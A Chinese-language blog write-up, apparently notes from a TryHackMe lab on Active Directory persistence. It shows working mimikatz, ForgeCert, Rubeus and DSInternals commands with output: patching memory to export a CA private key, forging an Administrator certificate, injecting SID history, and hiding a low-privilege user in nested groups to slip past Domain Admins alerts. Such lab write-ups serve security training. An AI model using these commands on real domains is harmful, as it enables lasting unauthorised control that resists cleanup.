title="各种服务中的示例"></a>各种服务中的示例</h4><div class="table-container"><table><thead><tr><th>Service Type</th><th>Service Silver Tickets</th></tr></thead><tbody><tr><td>WMI</td><td>HOST RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST HTTP</td></tr><tr><td>WinRM</td><td>HOST HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations includingMimikatz DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administration Tools</td><td>RPCSS LDAP CIFS</td></tr></tbody></table></div><p>上述服务我们都是可以进行伪造的</p><p>并且就是可以利用这些远程的服务进行远程控制  (这里就不写了  在上面的那篇参考文章里面有 可以自己去查看)</p><h3 id="黄金票据和白银票据的区别"><a href="#黄金票据和白银票据的区别" class="headerlink" title="黄金票据和白银票据的区别"></a>黄金票据和白银票据的区别</h3><h5 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h5><ul><li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>Silver Ticket: 伪造TGS,只能访问指定的服务</li></ul><p><strong>2.加密方式不同</strong></p><ul><li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ul><h5 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h5><ul><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul><h2 id="通过证书实现持久性"><a href="#通过证书实现持久性" class="headerlink" title="通过证书实现持久性"></a>通过证书实现持久性</h2><p>这里的话我们之前的一个房间里也讲过这个证书是什么  当时我们是利用这个证书模板来进行权限提审  获取到了这个管理员账户  </p><h3 id="什么是证书"><a href="#什么是证书" class="headerlink" title="什么是证书"></a>什么是证书</h3><p>AD 证书服务 （CS） 是 Microsoft 的公钥基础结构 （PKI） 实现。由于AD在组织中提供了一定程度的信任，因此它可以用作CA来证明和委托信任。AD CS用于多种用途，例如加密文件系统，创建和验证数字签名，甚至<strong>用户身份验证</strong>，使其成为攻击者的有前途的途径。</p><p>由于 AD CS 是一项特权功能，因此它通常在选定的域控制器上运行。这意味着普通用户无法真正直接与服务交互</p><blockquote><p>CA是证书颁发机构</p></blockquote><p>根据我们的访问权限，我们可以更进一步。我们可以简单地<strong>窃取根 CA 证书的私钥</strong>，以便在我们愿意时<strong>生成我们自己的证书</strong>。更糟糕的是，<strong>由于这些证书从未由CA颁发，蓝队无法撤销它们—(因为这是我们自己生成的 )</strong>。这对蓝队来说会更糟，因为这意味着CA的轮换，这意味着蓝队必须撤销所有颁发的证书才能将我们踢出局。想象一下，您刚刚花了两天时间通过轮换每个特权帐户的凭据，重置所有金票和银票来执行域收回，只是为了意识到攻击者通过成为您的CA来坚持。</p><h3 id="提取私钥"><a href="#提取私钥" class="headerlink" title="提取私钥"></a>提取私钥</h3><p>CA 的私钥存储在 CA 服务器本身上。<strong>如果私钥未通过基于硬件的保护方法（如硬件安全模块 （HSM））进行保护</strong>，对于仅将 Active Directory 证书服务 （AD CS） 用于内部目的的组织来说，这种情况通常如此，则它受计算机数据保护 API （DPAPI） 的保护。这意味着我们可以使用Mimikatz和SharpDPAPI等工具来提取CA证书，从而<strong>从CA中提取私钥</strong></p><h4 id="1-我们先来看看是否可以查看存储在-DC-上的证书："><a href="#1-我们先来看看是否可以查看存储在-DC-上的证书：" class="headerlink" title="1.我们先来看看是否可以查看存储在 DC 上的证书："></a>1.我们先来看看是否可以查看存储在 DC 上的证书：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::certificates /systemstore:local_machine</span><br></pre></td></tr></table></figure><blockquote><ul><li>crypto::certificates: 这是mimikatz的一个模块，用于操作证书相关的功能。</li><li>/systemstore:local_machine: 这是指定操作系统存储区的参数，其中”local_machine”表示本地计算机的系统存储区。</li></ul></blockquote><p><img src="../images/image-20230918111444044.png" alt="image-20230918111444044"></p><p><strong>这里解释一下获取的各个参数的含义</strong></p><blockquote><ul><li>System Store：系统存储区的名称，这里是”local_machine”，表示本地计算机的系统存储区。</li><li>Store：证书存储区的名称，这里是”My”，表示个人证书存储区。</li></ul><p>接下来是一个具体的证书信息：</p><ul><li>Subject：证书的主题，即证书所涉及的实体或组织。</li><li>Issuer：证书的颁发者，即签发该证书的实体或组织。</li><li>Serial：证书的序列号，用于唯一标识证书。</li><li>Algorithm：证书使用的加密算法。</li><li>Validity：证书的有效期，包括起始时间和结束时间。</li><li>Hash SHA1：证书的SHA1哈希值，用于唯一标识证书。</li><li>Key Container：证书的密钥容器，用于存储与该证书关联的密钥。</li><li>Provider：证书的加密提供程序，这里是”Microsoft RSA SChannel Cryptographic Provider”。</li><li>Provider type：提供程序的类型，这里是RSA_SCHANNEL (12)。</li><li>Type：密钥类型，这里是AT_KEYEXCHANGE，表示该证书用于密钥交换。</li><li>Provider name：提供程序的名称。</li><li>Key Container：密钥容器的名称。</li><li>Unique name：密钥容器的唯一名称。</li><li>Implementation：加密实现的类型。</li><li>Algorithm：加密算法的类型。</li><li>Key size：密钥的长度。</li><li>Key permissions：密钥的权限。</li><li>Exportable key：密钥是否可导出。</li></ul></blockquote><p>我们可以看到 DC 上有一个 CA 证书。我们还可以注意到，<strong>其中一些证书设置为不允许我们导出密钥(因为就是Exportable key  为No  所以就不能导出)</strong>。如果没有此私钥，我们将无法生成新证书。幸运的是，Mimikatz 允许我们修补内存以使这些键可导出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::capi</span><br><span class="line">Local CryptoAPI RSA CSP patched</span><br><span class="line">Local CryptoAPI DSS CSP patched</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::cng</span><br><span class="line">&quot;KeyIso&quot; service patched</span><br><span class="line"></span><br><span class="line">//使用上面的指令修补内存后 我们就可以导出证书了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::certificates /systemstore:local_machine /export</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918111933318.png" alt="image-20230918111933318"></p><p>绕过上面的这个<code>Exportable key</code>限制   <strong>成功的导出了证书和私钥</strong></p><p>导出的证书将以 PFX 和 DER 格式存储到磁盘：</p><blockquote><p>‘local<em>machine_My_0</em>.pfx’文件应该包含了私钥和相应的证书，可以用于在其他环境中导入和使用该私钥。</p><p>‘local<em>machine_My_0</em>.der’文件应该包含了一个公钥的导出结果。公钥是在加密和数字签名等过程中使用的关键信息，它可以被其他人使用来验证数字签名或加密数据。导出的公钥文件可以在其他环境中导入并用于进行加密和验证操作。</p></blockquote><p><img src="../images/image-20230918113528331.png" alt="image-20230918113528331"></p><p>这样子的话我们就能获取到所有证书了</p><p>证书 <code>za-THMDC-CA.pfx</code> 是我们特别感兴趣的证书。为了导出私钥，必须使用密码来加密证书。默认情况下，Mimikatz 分配的密码为 <code>mimikatz</code> </p><h3 id="生成我们自己的证书"><a href="#生成我们自己的证书" class="headerlink" title="生成我们自己的证书"></a>生成我们自己的证书</h3><p>现在我们有了私钥和根CA证书，我们可以使用SpectorOps ForgeCert工具为我们想要的任何用户伪造客户端身份验证证书。<code>ForgeCert</code>和<code>Rubeus</code>二进制文件是我们生成证书要用到的工具</p><p><strong>这里我们在获取到这个管理员证书后  我们可以将这个证书复制到别的低权限用户出 任何来给该用户伪造证书</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123</span><br></pre></td></tr></table></figure><ul><li><strong>CaCertPath - 导出的 CA 证书的路径。</strong></li><li>CaCertPassword - 用于加密证书的密码。默认情况下，Mimikatz 分配的密码 <code>mimikatz</code> 为 。</li><li><strong>Subject</strong> - 证书的使用者或公用名。这在我们将使用证书的上下文中并不重要。</li><li><strong>SubjectAltName</strong>-这是我们要使用此证书模拟的帐户的用户主体名称 （UPN）。它必须是合法用户。</li><li>NewCertPath - ForgeCert 将存储生成的证书的路径。</li><li>NewCertPassword - 由于证书需要导出私钥进行身份验证，因此我们必须设置用于加密它的新密码。</li></ul><h3 id="验证证书是否伪造成功"><a href="#验证证书是否伪造成功" class="headerlink" title="验证证书是否伪造成功"></a>验证证书是否伪造成功</h3><p>我们可以使用 Rubeus 使用证书请求 TGT，以验证证书是否受信任。我们将使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101</span><br></pre></td></tr></table></figure><p>这里的<code>password</code>是上面生成证书用到的<code>NewCertPassword</code>  </p><ul><li>/user - 这指定我们将模拟的用户，并且必须与我们生成的证书的 UPN 匹配</li><li>/enctype - 指定票证的加密类型。设置此项对于规避很重要，因为默认加密算法很弱，这会导致哈希超交警报</li><li>/certificate - 我们生成的证书的路径</li><li>/password - 证书文件的密码</li><li>/outfile - 我们的 TGT 将输出到的文件</li><li>/domain - 我们当前攻击的域的 FQDN</li><li>/dc - 我们从中请求 TGT 的域控制器的 IP。通常，最好选择运行 CA 服务的 DC</li></ul><p>执行命令后，我们应该收到我们的 TGT：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101</span><br><span class="line">          ______        _</span><br><span class="line">         (_____ \      | |</span><br><span class="line">          _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">         |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">         | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">         |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line">       </span><br><span class="line">         v2.0.0</span><br><span class="line">       </span><br><span class="line">       [*] Action: Ask TGT</span><br><span class="line">       </span><br><span class="line">       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert</span><br><span class="line">       [*] Building AS-REQ (w/ PKINIT preauth) for: &#x27;za.tryhackme.loc\Administrator&#x27;</span><br><span class="line">       [+] TGT request successful!</span><br><span class="line">       [*] base64(ticket.kirbi):</span><br><span class="line">       </span><br><span class="line">             doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk</span><br><span class="line">             MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC</span><br><span class="line">             BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ</span><br><span class="line">             nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/</span><br><span class="line">             MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD</span><br><span class="line">             zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr</span><br><span class="line">             2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW</span><br><span class="line">             ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM</span><br><span class="line">             Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5</span><br><span class="line">             i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW</span><br><span class="line">             NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf</span><br><span class="line">             SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF</span><br><span class="line">             CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw</span><br><span class="line">             S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG</span><br><span class="line">             CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk</span><br><span class="line">             RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+</span><br><span class="line">             f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO</span><br><span class="line">             hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS</span><br><span class="line">             n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G</span><br><span class="line">             vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP</span><br><span class="line">             iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY</span><br><span class="line">             5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g</span><br><span class="line">             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO</span><br><span class="line">             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3</span><br><span class="line">             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D</span><br><span class="line">             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=</span><br><span class="line">       </span><br><span class="line">         ServiceName              :  krbtgt/za.tryhackme.loc</span><br><span class="line">         ServiceRealm             :  za.tryhackme.loc</span><br><span class="line">         UserName                 :  Administrator</span><br><span class="line">         UserRealm                :  za.tryhackme.loc</span><br><span class="line">         StartTime                :  2/6/2022 5:54:46 PM</span><br><span class="line">         EndTime                  :  2/7/2022 3:54:46 AM</span><br><span class="line">         RenewTill                :  2/13/2022 5:54:46 PM</span><br><span class="line">         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">         KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=</span><br><span class="line">         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED</span><br></pre></td></tr></table></figure><h3 id="验证TGT是否有效"><a href="#验证TGT是否有效" class="headerlink" title="验证TGT是否有效"></a>验证TGT是否有效</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt administrator.kirbi</span><br></pre></td></tr></table></figure><p>然后访问域控共享文件夹</p><p>能访问成功就是有效</p><p><strong>这样的话本地管理员账户就伪造成功了</strong>  这样的话普通用户也具有了管理员的权限 并且这样的话就是即使修改管理员密码也不影响我们证书的使用</p><p>并且就是我们是自己导出私钥来自己生成的证书  那么在AD -CS中是找不到我们的证书的  所以是删除不掉的</p><p>那么想要删除的话就必须删除整个CA来使全部的CS失效才行  这样的话蓝队的工作量就会非常大了  这样子的话还会影响整个域的运行  可能会导致重建系统</p><p><strong>这个就是无需获取hash密码的权限维持</strong></p><h2 id="通过-SID-历史记录保持"><a href="#通过-SID-历史记录保持" class="headerlink" title="通过 SID 历史记录保持"></a>通过 SID 历史记录保持</h2><p>这个的话我在打春秋云镜的Time靶机的时候遇到过   <a href="https://www.cnblogs.com/f-carey/p/15705635.html">参考文章</a></p><h3 id="SID作用"><a href="#SID作用" class="headerlink" title="SID作用"></a>SID作用</h3><p><strong>SID 用于在连接到资源时跟踪安全主体和帐户的访问权限。但是，帐户上有一个有趣的属性，称为 SID 历史记录  SID History是在域迁移过程中需要使用的一个属性。</strong></p><blockquote><p> 如果A域中的域用户迁移到B域中，那么该用户的SID值就会改变，进而其权限也会改变。导致迁移后的用户无法访问以前可以访问的资源。<strong>SID History的作用是在域迁移过程中保持域用户的访问权限，如果迁移后用户的SID值改变，系统会将原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源—————（这句话就关键了  如果我们拿下域控后  将域控管理员的SID赋值给任意一个低权限用户的话  那么该低权限用户就拥有和域控管理员一样的权限了）</strong>。使用mimikatz可以将SID History属性添加到任意用户的SID History属性中。在渗透测试中，如果获得了域管理员权限（或者等同于域管理员权限），就可以将SID History作为实现持久化的方法。</p></blockquote><h3 id="SID-History利用"><a href="#SID-History利用" class="headerlink" title="SID-History利用"></a>SID-History利用</h3><ol><li>先去查看低权限用户的SID-History是否为空</li></ol><p><img src="../images/image-20230925102408995.png" alt="image-20230925102408995"></p><p>这确认我们的用户当前未设置任何 SID 历史记录。让我们获取域管理员组的 SID，因为这是我们要添加到 SID 历史记录的组：</p><ol><li>获取域控管理员账户的SID-History</li></ol><p><img src="../images/image-20230925102604847.png" alt="image-20230925102604847"></p><p>这里的话我们就可以成功获取这个域控管理员的SID了</p><ol><li>添加SID-History</li></ol><p><strong>我们可以使用类似Mimikatz的东西来添加SID历史记录。但是，最新版本的Mimikatz有一个缺陷，不允许它修补LSASS以更新SID历史记录。</strong>因此，我们需要使用其他东西。在这种情况下，我们将使用 DSInternals 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库：</p><p><img src="../images/image-20230925103039639.png" alt="image-20230925103039639"></p><blockquote><p>PS C:\Users\Administrator.ZA&gt; Import-Moduls DSInternals</p><p>PS C:\Users\Administrator.ZA&gt;Stop-Service -Name ntds -force  </p><p>PS C:\Users\Administrator.ZA&gt; Add-ADDBSidHistory -SamAccountName ‘username of our low-priveleged AD account’ -SidHistory ‘SID to add to SID History’ -DatabasePath C:\Windows\NTDS\ntds.dit  </p><p>PS C:\Users\Administrator.ZA&gt;Start-Service -Name ntds </p></blockquote><p>这里靶场不知道抽啥风了  报错没成功  反正就是按照上面三步走就行了  </p><p>还有一点就是  如果使用<code>mimikatz</code>的话也是可以的  但是要注意版本  有些版本是不行的  会报错</p><p><img src="../images/image-20230925104200242.png" alt="image-20230925104200242"></p><p>就是会爆出这个错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将高权限的 SID History 属性注入</span><br><span class="line">privilege::debug</span><br><span class="line"># 注入SID之前需要使用以下命令修复NTDS服务，否则无法将高权限的SID注人低权限用户的SID History属性;</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:tester /new:administrator</span><br><span class="line"></span><br><span class="line"># 查看 tester 用户的 SID History 属性</span><br><span class="line">Get-ADUser tester -Properties sidhistory</span><br><span class="line"></span><br><span class="line"># 清除恶意用户的 SID History 属性</span><br><span class="line">sid::clear /sam:username</span><br></pre></td></tr></table></figure><p>mimikatz有些版本就会支持这样做</p><h2 id="通过组成员身份实现持久性"><a href="#通过组成员身份实现持久性" class="headerlink" title="通过组成员身份实现持久性"></a>通过组成员身份实现持久性</h2><p>如果我们不想篡改 SID 历史记录，<strong>可以直接将自己添加到 AD 组中以实现持久性</strong>。虽然 SID 历史记录是一种很好的持久性技术，但凭据轮换和清理仍然可以删除持久性。在某些情况下，最好通过以 AD 组本身为目标来执行持久性。</p><h3 id="通过组成员身份实现持久性-1"><a href="#通过组成员身份实现持久性-1" class="headerlink" title="通过组成员身份实现持久性"></a>通过组成员身份实现持久性</h3><p>特权最高的帐户或组并不总是最适合用于持久性。特权组比其他组更密切地监视更改。任何归类为受保护组的组（如域管理员或企业管理员）都会受到额外的安全审查。因此，如果我们想通过组成员身份坚持下去，我们可能需要在将自己的帐户添加到的组上发挥创意，以实现持久性：</p><h3 id="嵌套组"><a href="#嵌套组" class="headerlink" title="嵌套组"></a>嵌套组</h3><p>这个组才是这里的关键  等会就是使用这个组来进行持久化</p><blockquote><p>在大多数组织中，有大量的递归组。递归组是作为另一个组成员的组。我们可以将其视为群体嵌套。组嵌套用于在 AD 中创建更有条理的结构。以 IT 支持组为例。IT 支持非常通用。因此，也许此组下有帮助台、访问卡管理器和网络管理员等子组。我们可以将所有这些组作为成员添加到 IT 支持组，从而为这些子组中的所有用户提供与 IT 支持组关联的权限和特权，但随后我们可以为每个子组分配更精细的权限和特权。</p></blockquote><p>虽然组嵌套有助于组织 AD，但它确实降低了有效访问的可见性。再次以我们的 IT 支持为例。如果我们向 AD 查询 IT 支持组的成员身份，它将以 3 计数进行响应。但是，这个计数并不真实，因为它是三组。为了了解有效访问，我们现在还必须枚举这些子组。但这些子组也可以有子组。所以问题变成了：“我们应该枚举多少层才能获得真正的有效访问号码？</p><p>这也成为一个监控问题。例如，假设我们有一个警报，当将新成员添加到域管理员组时，该警报会触发。这是一个很好的警报，但如果将用户添加到域管理员组中的子组，则不会触发。这是一个非常常见的问题，因为 AD 由 AD 团队管理，警报和监视由 InfoSec 团队管理。我们所需要的只是一点点沟通不畅，并且警报不再有效，因为使用了子组。</p><p>作为攻击者，我们可以利用这种降低的可见性来执行持久性。我们没有针对为我们提供环境访问权限的特权群体，而是将注意力集中在子群体上。我们不会将自己添加到会引发警报的特权组中，而是将自己添加到未受监视的子组中。</p><p><strong>上面就是为什么要用这个嵌套组的原因了</strong></p><h3 id="利用嵌套组"><a href="#利用嵌套组" class="headerlink" title="利用嵌套组"></a>利用嵌套组</h3><p>让我们模拟这种类型的持久性。为了允许其他用户也执行该技术，请确保在你创建的所有组前面加上您的用户名。为了模拟持久性，我们将创建一些自己的组。让我们首先创建一个新的基本组，我们将隐藏在人员&gt;IT 组织单位 （OU） 中：</p><ol><li>第一步</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path &quot;OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 1&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup1&quot; -DisplayName &quot;&lt;username&gt; Nest Group 1&quot; -GroupScope Global -GroupCategory Security</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230925112142504.png" alt="image-20230925112142504"></p><ol><li>第二步</li></ol><p>现在，让我们在人员&gt;销售 OU 中创建另一个组，并将我们以前的组添加为成员：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path &quot;OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 2&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup2&quot; -DisplayName &quot;&lt;username&gt; Nest Group 2&quot; -GroupScope Global -GroupCategory Security </span><br><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup2&quot; -Members &quot;&lt;username&gt;_nestgroup1&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230925112326892.png" alt="image-20230925112326892"></p><ol><li>第三步</li></ol><p>我们可以再这样做几次，每次将前一个组添加为成员：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 3&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup3&quot; -DisplayName &quot;&lt;username&gt; Nest Group 3&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup3&quot; -Members &quot;&lt;username&gt;_nestgroup2&quot;</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 4&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup4&quot; -DisplayName &quot;&lt;username&gt; Nest Group 4&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup4&quot; -Members &quot;&lt;username&gt;_nestgroup3&quot;</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 5&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup5&quot; -DisplayName &quot;&lt;username&gt; Nest Group 5&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup5&quot; -Members &quot;&lt;username&gt;_nestgroup4&quot;</span><br></pre></td></tr></table></figure><p>对于最后一个组，现在让我们将该组添加到域管理员组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;&lt;username&gt;_nestgroup5&quot;</span><br></pre></td></tr></table></figure><p>最后，让我们将低特权 AD 用户添加到我们创建的第一个组中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup1&quot; -Members &quot;&lt;low privileged username&gt;&quot;</span><br></pre></td></tr></table></figure><blockquote><p>最后生成的嵌套组的样子</p><p>IT——&gt;OU</p><p>​    第五组—————(IT组)</p><p>​        第四组</p><p>​            第三组</p><p>​                第二组</p><p>​                    第一组————(IT组)</p><p>就是这样的嵌套模式   